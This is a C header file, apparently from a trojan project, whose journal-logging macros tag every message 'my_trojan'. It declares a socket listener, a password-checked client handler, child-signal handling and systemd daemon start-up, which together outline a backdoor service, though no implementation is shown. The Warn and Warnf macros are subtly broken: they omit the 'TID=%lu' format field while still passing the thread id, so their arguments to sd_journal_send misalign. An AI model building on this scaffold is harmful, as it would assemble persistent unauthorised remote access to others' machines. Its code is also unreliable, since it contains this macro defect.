#ifndef __PAYLOAD_INC
#define __PAYLOAD_INC

#include "shared.h"

#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/syslog.h>
#include <sys/wait.h>
#include <systemd/sd-daemon.h>
#include <systemd/sd-journal.h>
#include <threads.h>
#include <unistd.h>

// macros as per:
// https://www.freedesktop.org/software/systemd/man/latest/sd_journal_print.html#
// https://www.freedesktop.org/software/systemd/man/latest/systemd.journal-fields.html#
#define Debug(fmt)                                                             \
	(sd_journal_send("MESSAGE=" fmt, "PRIORITY=%i", LOG_DEBUG, "TID=%lu",      \
		thrd_current(), "SYSLOG_IDENTIFIER=%s", "my_trojan", NULL))

#define Debugf(fmt, ...)                                                       \
	(sd_journal_send("MESSAGE=" fmt, "PRIORITY=%i", LOG_DEBUG, "TID=%lu",      \
		thrd_current(), "SYSLOG_IDENTIFIER=%s", "my_trojan", __VA_ARGS__,      \
		NULL))

#define Info(fmt)                                                              \
	(sd_journal_send("MESSAGE=" fmt, "PRIORITY=%i", LOG_INFO, "TID=%lu",       \
		thrd_current(), "SYSLOG_IDENTIFIER=%s", "my_trojan", NULL))

#define Infof(fmt, ...)                                                        \
	(sd_journal_send("MESSAGE=" fmt, "PRIORITY=%i", LOG_INFO, "TID=%lu",       \
		thrd_current(), "SYSLOG_IDENTIFIER=%s", "my_trojan", __VA_ARGS__,      \
		NULL))

#define Warn(fmt)                                                              \
	(sd_journal_send("MESSAGE=" fmt, "PRIORITY=%i", LOG_WARNING,               \
		thrd_current(), "SYSLOG_IDENTIFIER=%s", "my_trojan", NULL))

#define Warnf(fmt, ...)                                                        \
	(sd_journal_send("MESSAGE=" fmt, "PRIORITY=%i", LOG_WARNING,               \
		thrd_current(), "SYSLOG_IDENTIFIER=%s", "my_trojan", __VA_ARGS__,      \
		NULL))

#define Err(fmt)                                                               \
	(sd_journal_send("PRIORITY=%i", LOG_ERR, "ERRNO=%d", errno, "TID=%lu",     \
		thrd_current(), "SYSLOG_IDENTIFIER=%s", "my_trojan", "MESSAGE=" fmt,   \
		NULL))

#define Errf(fmt, ...)                                                         \
	(sd_journal_send("PRIORITY=%i", LOG_ERR, "ERRNO=%d", errno, "TID=%lu",     \
		thrd_current(), "SYSLOG_IDENTIFIER=%s", "my_trojan", "MESSAGE=" fmt,   \
		__VA_ARGS__, NULL))

// macros as per:
// https://www.freedesktop.org/software/systemd/man/latest/sd_notify.html#
#define NotifyReady(pid, fmt) (sd_pid_notifyf(pid, 0, "READY=1\nSTATUS=" fmt))

#define NotifyReadyf(pid, fmt, ...)                                            \
	(sd_pid_notifyf(pid, 0, "READY=1\nSTATUS=" fmt, __VA_ARGS__))

#define NotifyStopping(pid, fmt)                                               \
	(sd_pid_notifyf(                                                           \
		pid, 0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d\nSTATUS=" fmt, errno))

#define NotifyStoppingf(pid, fmt, ...)                                         \
	(sd_pid_notifyf(pid, 0,                                                    \
		"STOPPING=1\nEXIT_STATUS=1\nERRNO=%d\nSTATUS=" fmt, errno,             \
		__VA_ARGS__))

/* Signal handler */
int install_sigchld_handler(void);

/* socket + fd manipulation */
int create_listener(void);

/* client buffer manipulation */
int		client_buffer_has_seat(void);
int		client_buffer_acquire_seat(pid_t client_id);
int32_t client_buffer_remove_seat(pid_t client_id);

/* event loop */
int handle_client(const char *const password, int client_fd);

/* service file manipulation */
void start_daemon(void);
#endif // __PAYLOAD_INC
